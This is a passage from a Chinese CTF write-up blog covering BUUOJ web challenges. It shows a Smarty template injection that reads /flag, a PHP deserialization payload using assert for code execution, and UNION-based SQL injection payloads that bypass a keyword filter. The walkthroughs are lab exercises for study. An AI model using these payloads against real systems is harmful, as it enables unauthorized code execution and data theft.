class="attr">class</span>=<span class="string">&quot;col-xs-offset-1 col-xs-10&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                        You should use this because:</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>You can initiate requests without any limit.<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>Does not record the visitor information.<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;api row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>API Usage<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-offset-1 col-xs-11&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;table-responsive&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-striped table-bordered table-hover&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>-<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>API URI<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;50px&quot;</span>&gt;</span>Type<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>Sample Output<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>get IP<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>http://node4.buuoj.cn:25857/%7B%7B1+2%7D%7Dapi<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>text/html<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>8.8.8.8<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>get XFF(X-Forwarded-For)<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>http://node4.buuoj.cn:25857/%7B%7B1+2%7D%7Dxff<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>text/html<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>8.8.8.8<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            </span><br><span class="line">                            </span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;examples row&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom:0;&quot;</span>&gt;</span>Connection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-offset-1 col-xs-10&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Request-Header<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">pre</span>&gt;</span>GET / HTTP/2.0</span><br><span class="line">Host: www.ip.la</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;font-size:14px;&quot;</span>&gt;</span>Build With Smarty !<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问url/api/和url/xxf/都会访问到一个IP地址，没发现有什么大用处</p>
<p>尝试下面访问的时候，出现了我们需要的东西：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">访问：http://xxx.xxx.xxx.com/123</span><br><span class="line"></span><br><span class="line">得到：</span><br><span class="line">- 								API URI 						Type	 	Sample Output</span><br><span class="line">get IP 						http://node4.buuoj.cn:25857/123api 	text/html 	8.8.8.8</span><br><span class="line">get XFF(X-Forwarded-For) 	http://node4.buuoj.cn:25857/123xff 	text/html 	8.8.8.8</span><br></pre></td></tr></table></figure>

<p>任意字符串都能以这种形式返回</p>
<h2 id="解题-19"><a href="#解题-19" class="headerlink" title="解题"></a>解题</h2><p>既然存在，使用BP测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /&#123;&#123;1+3&#125;&#125; HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:25857</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>返回包：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 只保留关键信息</span><br><span class="line">- 								API URI 						Type	 	Sample Output</span><br><span class="line">get IP 						http://node4.buuoj.cn:25857/4api 	text/html 	8.8.8.8</span><br><span class="line">get XFF(X-Forwarded-For) 	http://node4.buuoj.cn:25857/4xff 	text/html 	8.8.8.8</span><br></pre></td></tr></table></figure>

<p>下面的数据包都保留关键信息进行展示</p>
<p>再发包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /&#123;&#123;var_dump(scandir(<span class="string">&#x27;/&#x27;</span>))&#125;&#125; HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">20</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;.dockerenv&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;bin&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dev&quot;</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;etc&quot;</span></span><br><span class="line">  [<span class="number">6</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span></span><br><span class="line">  [<span class="number">7</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;home&quot;</span></span><br><span class="line">  [<span class="number">8</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;lib&quot;</span></span><br><span class="line">  [<span class="number">9</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;media&quot;</span></span><br><span class="line">  [<span class="number">10</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;mnt&quot;</span></span><br><span class="line">  [<span class="number">11</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;opt&quot;</span></span><br><span class="line">  [<span class="number">12</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;proc&quot;</span></span><br><span class="line">  [<span class="number">13</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;root&quot;</span></span><br><span class="line">  [<span class="number">14</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;run&quot;</span></span><br><span class="line">  [<span class="number">15</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;sbin&quot;</span></span><br><span class="line">  [<span class="number">16</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;srv&quot;</span></span><br><span class="line">  [<span class="number">17</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;sys&quot;</span></span><br><span class="line">  [<span class="number">18</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;usr&quot;</span></span><br><span class="line">  [<span class="number">19</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;var&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到了文件列表，当然是想办法得到文件内容了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /&#123;&#123;<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#125; HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>

<p>返回包：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;cd5e78ea-ede1-4fc7-b3a0-6547bad11b34&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><h2 id="原始信息-20"><a href="#原始信息-20" class="headerlink" title="原始信息"></a>原始信息</h2><p>在题目信息当中找到一个链接，跳转后找到对应的php源码信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure>

<p>观察便可看出这是一个反序列化。</p>
<h2 id="解题-20"><a href="#解题-20" class="headerlink" title="解题"></a>解题</h2><p>对源码进行解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="comment"># 定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="comment"># 初始化方法，初始化类内部变量</span></span><br><span class="line">    <span class="comment"># 即：创建即调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 销毁变量时将变量作为函数进行调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义新类</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一旦存在source变量就截断这个程序</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化传入的data</span></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure>

<p>代码的核心在于反序列化那部分，前面的source舍弃即可绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">反序列化部分的data一般情况下是调用当前文件拥有的类。</span></span><br><span class="line"><span class="comment">这道题有一个不易察觉，容易踩坑的考点，就是：</span></span><br><span class="line"><span class="comment">	php配置文件限制了很多函数，服务器返回500的状态码基本就没戏了</span></span><br><span class="line"><span class="comment">这里真正需要反序列化的只有一个东西，只需要反序列化掉即可。</span></span><br><span class="line"><span class="comment">下面是反序列化脚本：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>; </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># assert是system的替代品</span></span><br></pre></td></tr></table></figure>

<p>把反序列化的脚本得到的结果放上去就能得到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get:http://xxx.xxx.xxx/time.php?data=O:8:<span class="string">&quot;HelloPhp&quot;</span>:2:&#123;s:1:<span class="string">&quot;a&quot;</span>;s:9:<span class="string">&quot;phpinfo()&quot;</span>;s:1:<span class="string">&quot;b&quot;</span>;s:6:<span class="string">&quot;assert&quot;</span>;&#125;</span><br><span class="line"><span class="built_in">return</span>:(省略若干页面搜索)flag&#123;de0a588b-c255-4b66-a7d1-5278825f706c&#125; </span><br></pre></td></tr></table></figure>

<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>这个题目的表层代码很容易读懂，但是做题人是看不到内部配置限制了哪些函数，只能自己一点点的慢慢测试，直到测试到自己想要的函数输出对应的flag为止。</p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><h2 id="原始信息-21"><a href="#原始信息-21" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">题目提供的是：用户登录，用户注册，登录后主页展示，展示广告申请</span><br><span class="line">1.登录名无法绕过，有admin用户，同时无法爆破admin密码</span><br><span class="line">2.注册并且登录后，展示的功能点页面就只有申请注册广告，没有发现其它功能点</span><br><span class="line">3.扫站扫不出个所以然</span><br><span class="line"></span><br><span class="line">现在能直接看到效果的是：</span><br><span class="line">1.用户登录后的主页：能看到新注册的用户广告申请</span><br><span class="line">2.广告申请：能申请广告</span><br></pre></td></tr></table></figure>

<h2 id="解题-21"><a href="#解题-21" class="headerlink" title="解题"></a>解题</h2><p>申请广告位：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-signin&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;form-signin-heading&quot;</span>&gt;</span>广告申请<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputEmail&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>广告名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;广告名&quot;</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputPassword&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>广告内容<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;内容不超过40个字&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ac&quot;</span> <span class="attr">value</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-lg btn-primary btn-block&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;申请&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php&quot;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>申请后，用户主页会回显一条相关的申请信息，并且可以插入js代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">广告名 	广告内容 		状态 			详情</span><br><span class="line">user		123			待管理确认	广告详情</span><br><span class="line"></span><br><span class="line">点击广告详情，会出现一个对应的页面，URL疑似SQL注入</span><br><span class="line">http://xx.xx.xx/detail.php?id=1</span><br><span class="line">测试了半天，没有任何破绽。无论任何SQL语句测试都无效。</span><br></pre></td></tr></table></figure>

<p>已经写完的广告申请无法找到SQL注入，试着找写入广告是不是有漏洞：</p>
<p>暂时不管广告内容部分，先测标题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">标题部分：</span><br><span class="line">	<span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="string">&#x27;=&#x27;</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">返回：</span></span><br><span class="line"><span class="string">	标题含有敏感词汇</span></span><br><span class="line"><span class="string">测试：</span></span><br><span class="line"><span class="string">	允许：	&#x27;</span> = </span><br><span class="line">	不允许：<span class="keyword">or</span> -- <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">尝试使用<span class="comment">/**/</span>代替空格，输入完毕后点击详情查看注入结果：</span><br><span class="line">	title=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span>&amp;content=<span class="number">123</span>&amp;ac=add</span><br><span class="line">它会返回一个东西：</span><br><span class="line">    广告名		广告内容	状态</span><br><span class="line">    <span class="number">2</span>			<span class="number">3</span>		待管理员确认</span><br><span class="line">两个回显点出来了</span><br><span class="line">    </span><br><span class="line">尝试爆下数据库名和版本号信息</span><br><span class="line">   title=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span>&amp;content=<span class="number">123</span>&amp;ac=add</span><br><span class="line">回显：</span><br><span class="line">    <span class="number">0.2</span>.<span class="number">26</span>-MariaDB-log	web1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>没有办法使用information_schema,发现还有其他表如<strong>mysql.innodb_table_stats</strong>和<strong>sys.schema_table_statistics_with_buffer</strong>可以看表名、数据库名，就是没有列名。</p>
</blockquote>
<p>上面的这段话引自他人博客，information_schema表确实被禁用了，必须找其它方法调用相似的表来处理问题。</p>
